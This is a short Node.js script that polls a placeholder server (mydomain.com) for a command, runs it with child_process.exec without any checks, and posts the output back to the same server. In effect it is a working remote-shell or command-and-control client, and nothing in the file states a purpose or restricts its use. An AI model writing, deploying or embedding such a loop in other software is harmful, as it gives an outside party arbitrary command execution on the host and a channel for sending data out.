var http = require("http");
var request = require("request");
var exec = require("child_process").exec;
var child;

// define our http options for the get
var httpOptions = {
	host: "mydomain.com",
	port: 3000,
  path: "/api"
};

// get the command from the server
http.get(httpOptions, function(response) {
	var body = "";
	response.on("data", function(d) {
		body += d;
	});
	
	response.on("end", function() {
		var parsed = JSON.parse(body);
		// store the command in a variable
		var command = parsed.command;
		
		// execute the command
		child = exec(command,
		  function (error, stdout, stderr) {
			
			// log out the response from executing the command
			console.log(stdout);
			
			// post the results of the command execution back to the server
			request({
				url: "http://mydomain.com/",
				method: "POST",
				json: {
					cmdReturn: stdout,
				}
			}, function(error, response, body){
				if(error) {
					console.log(error);
				} else {
					// log the success message received from the server
					console.log(response.statusCode, body);
				}
			});
			
			// error handling for exec()
			if (error !== null) {
			  console.log("exec error: " + error);
			}
		});
	});
});